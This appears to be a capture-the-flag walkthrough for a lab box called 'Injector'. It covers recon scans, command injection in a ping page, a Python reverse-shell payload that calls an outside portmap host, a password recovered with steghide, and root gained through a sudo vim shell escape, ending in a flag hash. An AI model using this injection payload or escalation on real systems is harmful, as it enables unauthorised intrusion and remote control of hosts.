# Injector

```
nmap -sC -sV 10.10.10.10
```

<img width="870" height="326" alt="image" src="https://github.com/user-attachments/assets/bada1cf8-b495-474f-8cfb-3f9c7b77105b" />

```
dirsearch -u http://172.24.170.117/
```

<img width="657" height="110" alt="image" src="https://github.com/user-attachments/assets/97c6818a-6734-45c3-8e38-152a5a4d988b" />

```
dirsearch -u http://172.24.170.117/secret/ -e php -x 404,403
```

<img width="830" height="362" alt="image" src="https://github.com/user-attachments/assets/7b9f184d-ea92-49ab-9fa2-048ba7f82576" />

----

```
http://54.151.66.45/secret/tools/ping.php
```

<img width="1116" height="311" alt="image" src="https://github.com/user-attachments/assets/9f7af11e-f659-4c54-be09-8f5a11a22802" />

```
127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("FRANKISHTIEN-64015.portmap.host",64015));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<img width="672" height="158" alt="image" src="https://github.com/user-attachments/assets/7efc4ec7-a7ba-4237-b010-b143ac772e21" />

```
python3 -c 'import pty,os; pty.spawn("/bin/bash")'
```

<img width="665" height="117" alt="image" src="https://github.com/user-attachments/assets/fcee3f31-1c75-4c97-b9db-5ec05cd245d8" />

```
## on server
python3 -m http.server 8888
## on my kali
wget http://54.151.66.45:8888/TrollFace.jpg
```

<img width="614" height="132" alt="image" src="https://github.com/user-attachments/assets/f753c363-a0f0-40a5-bd50-df43dd0eab26" />

## user alex

```
steghide extract -sf TrollFace.jpg 
```

<img width="956" height="297" alt="image" src="https://github.com/user-attachments/assets/c5f5d0e0-0d68-4498-a74f-4e2978015be5" />

```
D0n41dTrump
```

```
su alex
```

<img width="569" height="161" alt="image" src="https://github.com/user-attachments/assets/a7bbc294-c4c3-405c-9448-cef658fb0dcb" />

```
sudo -l
```

<img width="960" height="193" alt="image" src="https://github.com/user-attachments/assets/422eefaa-804b-463f-8bd6-0029dff3ad3d" />

[gtfobins](https://gtfobins.github.io/gtfobins/vim/#sudo)

```
sudo vim -c ':!/bin/sh'
```

<img width="913" height="514" alt="image" src="https://github.com/user-attachments/assets/b82388d9-c60f-4ddb-87c8-020cb1f0a0ee" />

```
2afe5ca13f6aa7c615c05d9cceb6c23e
```

